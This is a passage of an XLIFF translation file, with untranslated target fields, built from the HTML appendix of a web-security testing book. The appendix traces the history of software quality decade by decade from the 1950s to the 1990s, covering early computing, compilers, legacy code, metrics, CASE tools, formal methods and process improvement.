        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>1950 to 1959: Genesis</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>1950 to 1959: Genesis</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The practice of programming computers arose in part from US military needs in World War II. From computing bomb trajectories to decrypting enemy communications, the war fed the need for better and faster ways to compute. The problems that required immediate solution were numerical and computationally intense: They drove the best and brightest to develop machinery to solve them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first &amp;quot;computers&amp;quot; were human beings, mostly women who hadn't been accepted into the US armed forces in the 1940s. They cranked mechanical adding machines in great assembly lines. It's intriguing to think of a program in those terms: a line of women standing at their stations, each performing her portion of a bomb trajectory calculation and handing the answer off to a colleague to compute the next step.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But under the urgency of war, speed was just as important as accuracy, and Presper Eckert's and John Mauchley's ENIAC computer offered both. Further, the war offered a funding opportunity that might not otherwise have come about. The ENIAC was more electrical than mechanical&amp;mdash;it used electricity not just to drive the mechanical parts but to actually calculate. This machine could not only produce results, but it could automatically use those results in other calculations. However, the ENIAC wasn't ready in time and failed to make an impact during the war (Scott McCartney, &lt;span class="docEmphasis"&gt;ENIAC: The Triumphs and Tragedies of the World's First Computer&lt;/span&gt;, Walker and Company, New York, 1999). It wasn't until after the war that the world felt the impact of the first electrical computers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Postwar uses for computers tended to follow the wartime themes. Computers existed to solve highly mathematical problems, and their first programmers were mostly the people who defined and derived the equations. These physicists and mathematicians worked the way you might expect. They designed algorithms carefully. They rigorously documented, peer-reviewed, and implemented mathematical proofs. Never in the history of software development have more meticulous minds addressed the task of programming.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, by modern standards, the problems these talented pioneers solved were relatively straightforward. This is not to say that the algorithms and mathematics were simple&amp;mdash;quite the contrary. But the 1950s era of computers and programming environments were capable of only the most basic instructions and operations. Modern operating systems with thousands of built-in functions and services did not exist. Hardware had no flexible communication protocols or programmable peripherals and devices.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Thus, the 1950s saw extraordinarily talented people solving problems that they intimately understood in programming environments that had few complicated instructions. In other words, it was a decade of smart people solving well-understood problems: a recipe for success by all accounts and a perfect way to start the discipline of software development.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>1960 to 1969: Exodus</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>1960 to 1969: Exodus</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>By the late 1950s, computers had become quite a phenomenon, and at the dawn of the 1960s, the discipline of software development went public. Universities began offering degree programs in this new technology, and the number of hardware manufacturers grew rapidly. Suddenly, computer hardware and training were accessible to the general public&amp;mdash;or at least to the subset that attended college.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>At the same time, computers were undergoing big advances in usability and capability. The problems they could solve grew in scope and complexity. The programming languages designed to solve those problems were also becoming more powerful and easier to apply. The 1960s were a phenomenal growth period for computing technology and set the tone for the remainder of the century.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The 1960s also offered the industry's first chance to go astray. Less rigorous minds were tackling harder problems. (Indeed, how could the industry have found more rigorous, meticulous developers than it had in the 1950s?) This was the perfect recipe for disaster&amp;mdash;but the disaster never happened. Software written during the 1960s attained the same high quality as programs written in the previous decade.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This seeming paradox has a simple, though unobvious, explanation: The factor that kept programmers honest and program quality high in the 1960s was the unavailability of personal compilers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Compilation in the 1960s was not an easy endeavor. For the most part, a company or university owned only a single, huge computer. This computer's compiler was, first, located a long walk from the programmer's office; second, so heavily booked that access required advance reservations; and, third, painfully unsympathetic to misuses of programming language syntax and constructs.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In other words, compiling a program that wasn't near perfect was a significant waste of time and effort, and it could lead to substantial rework. Imagine walking a half mile across campus with a nine-inch stack of punched cards only to have the stack of cards rejected by a &amp;quot;type mismatch&amp;quot; error on card 30. This could result in days, even weeks, of delay before another session with the sole compiler became available.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This painful compilation process kept programmers at their office desks&amp;mdash;checking, soliciting peer review, and reading, reading, reading their cards (the code) until they had exhausted every available avenue of review. No measures were too extreme, because the price for sloppiness was severe.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>So, in the 1960s, as complexity grew and less rigorous-minded people tackled the problems, the discipline of software development had leaped its first serious hurdle&amp;mdash;software's debut to the wider public was a success.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>1970 to 1979: Chaos</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>1970 to 1979: Chaos</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The 1970s were not good years for software quality advocates. The challenges of the 1960s&amp;mdash;harder problems and less-trained practitioners&amp;mdash;worsened. On the flip side, inaccessible and time-consuming compilation became a thing of the past. The advent of the PC changed the rules of programming, removing the constraints that kept quality high in the 1960s.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Desktop computing made the computer a tool for truly all people&amp;mdash;not just mathematicians, university researchers, and military strategists. No longer did anyone need to wait hours, days, or weeks for the privilege of compiler access, because every PC could have a built-in compiler. Compilation was available any time a programmer wanted a quick syntax check. Why bother with all that desk checking when you could consult a compiler to determine syntactical correctness?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Perhaps what drove programmers to such relative laziness was the fact that the type of problems software was tackling had also changed. No longer did programmers just code mathematical algorithms. They were building systems to let companies do business faster and more efficiently. They were building software that had never before been possible.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It was in this era that programmers began passing bugs off as features. Na&amp;iuml;ve, 1970s-era users willingly submitted to complicated workarounds if they believed it was &amp;quot;the only way to implement a feature.&amp;quot; Programmers went so far as to pass off bugs as configuration or operating-environment problems caused by users. Users readily shouldered the blame because they understood so little about what was actually happening under the covers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Testing was another casualty of the chaos decade. In the 1960s, competent developers had performed all review and testing functions. But the 1970s-era rush to devise automated solutions to new problems&amp;mdash;and new features for existing systems&amp;mdash;created a huge demand for programmers. So everyone with software training flocked to programming, and testing was overlooked in the flurry.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Granted, software development organizations did not shun testing altogether, but many organizations turned that task over to unskilled personnel, essentially transforming administrative staff into testers. Testers today still endure the stigma associated with software testing that arose in those early years.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Code written in the 1970s is the bane of modern programming. It even has a special name: legacy code. Legacy code is feared, poorly understood, and worried over; most software professionals try to avoid making its maintenance part of their careers. After all, someone else's code can be hard to understand, and one mistake made modifying code can cause undesirable side effects, no matter how much testing takes place.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, the other significant arrival on the 1970s scene was metrics&amp;mdash;those numbers that supposedly tell a story about code's &amp;quot;goodness&amp;quot; but whose interpretation is often overly subjective. The chaos decade got metrics off to a bad start. The theory that evolved centered on quantifying</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>aspects of the source code&amp;mdash;the number of loops, branches, conditional statements, and so forth. Instead of trying to determine whether the software was functionally correct, developers could simply count particular elements in code to determine its complexity.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This was a tempting diversion in the 1970s, and perhaps it gave many developers a sense of satisfaction about their code. However, to this day the use of metrics remains the exception to the rule. Most developers ignore metrics, because they realize that good programmers can create very good code that rates poorly according to some metric, and poor programmers can write bad code that looks good according to a metric. So, unfortunately, the repute of metrics has suffered because of its initial misrepresentation of reality. Good, modern functional-correctness metrics still suffer from their association with code complexity metrics that originated in the 1970s.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The bottom line for chaos decade software is that the focus was code-centric and not quality-centric. By the end of the 1970s, it became apparent that changes in the industry were necessary. And the first book on software testing (Glenford Myers, &lt;span class="docEmphasis"&gt;The Art of Software Testing&lt;/span&gt;, Wiley, 1979) arrived at this decade's end. It was a clear signal that change was in the air.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01lev1sec4.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>1980 to 1989: Repair</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>1980 to 1989: Repair</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>During the 1980s, several efforts arose to repair the common wisdom of software development. Two stand out as being particularly noteworthy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>CASE Tools</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first came in the form of computer-aided software engineering, known as CASE. In more general terms, we could call the CASE repair effort &amp;quot;the advent of code development tools.&amp;quot; The CASE idea was that programmers would create better software if they had software tools assisting them. (Every craftsperson needs the right tools. Carpenters need hammers, for example. Try beating a nail into a board with a shoe.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Like carpenters, software developers have their own set of basic trusted tools: the editor, compiler, and debugger. The CASE movement brought them access to more advanced tools, such as fourth-generation programming languages (which have their own acronym, 4GL). Unfortunately, 4GLs and most other high-end tools haven't lived up to expectations. Take Visual Basic as an example: By all accounts, this is a useful, powerful, and popular 4GL tool, making programmers more productive and less error prone. However, the best-paying jobs are for C developers, and the majority of large applications are still primarily coded in C (Brian W. Kernighan and Dennis M. Ritchie, &lt;span class="docEmphasis"&gt;The C Programming Language&lt;/span&gt;, Prentice-Hall, 1978). Admittedly, 4GL and CASE tools have their place, but general-purpose tools such as editors, compilers, and debuggers are the staples of software developers today, despite the CASE hype of the early 1980s.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another reason that tools have failed to capture large-scale attention is that their very nature as quality enhancers works against them. If a tool promises dramatic quality gains, shouldn't the tool itself be of high quality? Have the tool's developers applied the tool to itself? Buggy tools sold to enhance quality rarely endear themselves to software developers. Lastly, the quality of the person using the tool is also important. The saying &amp;quot;a fool with a tool is still a fool&amp;quot; still holds true and represents a situation that will certainly not engender higher-quality software.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Formal Methods</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The second major solution proposed in the 1980s for producing higher-quality code was the use of formal methods. As with CASE, many touted formal methods as a software engineering silver bullet (Richard Linger, &amp;quot;Cleanroom Process Model,&amp;quot; &lt;span class="docEmphasis"&gt;IEEE Software&lt;/span&gt;, vol. 11, no. 2, Mar. 1994, pp. 50&amp;ndash;58). And, just as with CASE, the bullet turned out to contain a bit of silver but remained mostly lead.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What was silver in formal methods consisted of techniques such as information hiding, structured programming, and stepwise refinement, as the &amp;quot;&lt;a class="docLink" href="app01lev1sec6.html#app01sb01"&gt;Silver Linings in Formal Methods&lt;/a&gt;&amp;quot; sidebar explains. That these techniques, which originated or became widespread in the 1980s, are still common practice for modern programmers provides evidence of their success. Structured programming and object orientation (which is firmly rooted in the principles of information hiding) are undeniably useful for producing higher-quality code; they are now so widely used that they are the rule rather than the exception for modern development.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, rigorous formal methods never caught on in mainstream software development organizations. Despite a smattering of organizations that claim to do Cleanroom (a variant of rigorous formal methods; see David P. Kelly and Robert S. Oshana, &amp;quot;Integrating Cleanroom Software Engineering Methods into an SEI Level 4-5 Program,&amp;quot; &lt;span class="docEmphasis"&gt;Crosstalk&lt;/span&gt;, Nov. 1996), the overwhelming majority of modern software development is still ad hoc. The reasons are cost and return on investment. Formal methods are difficult to use, time-consuming, and often nearly require the person applying them to have a PhD in computer science for proper deployment. What's more, as in the 1980s, there's still a serious lack of tools to assist developers in using formal methods.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Nevertheless, the repair decade produced valuable ideas for increasing developer productivity. In addition, the researchers who worked tirelessly to develop formal methods gave the scientific community techniques that more systematically guide development practices. The 1980s ended with the universal recognition of the importance of software practices&amp;mdash;and with a change in attitude toward the requirement to attain higher levels of quality.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app01lev1sec5.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>1990 to 1999: Process</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>1990 to 1999: Process</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The next major &amp;quot;solution&amp;quot; to the software quality problem came in the 1990s under the phrase &lt;span class="docEmphasis"&gt;software process improvement&lt;/span&gt;. At the center of this movement was the much heralded, often derided, Capability Maturity Model or CMM; see &amp;quot;&lt;a class="docLink" href="app01lev1sec6.html#app01sb02"&gt;The Capability Maturity Model&lt;/a&gt;&amp;quot; sidebar for a short explanation. For brevity's sake, we'll oversimplify the software process improvement dogma: &lt;span class="docEmphasis"&gt;Software development is a management problem to which you can apply proper procedures for managing data, processes, and practices to good end. Controlling the way software is produced ensures better software&lt;/span&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In other words, because developers had failed to manage their projects appropriately (as evidenced historically by software's poor track record for quality), managers must install organizational controls to manage for them. The problem with this belief is many-fold, because even the best processes in the world can be misapplied (Jeffrey Voas, &amp;quot;Can Clean Pipes Produce Dirty Water?&amp;quot; &lt;span class="docEmphasis"&gt;IEEE Software&lt;/span&gt;, vol. 14, no. 4, July 1997, pp. 93-95).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
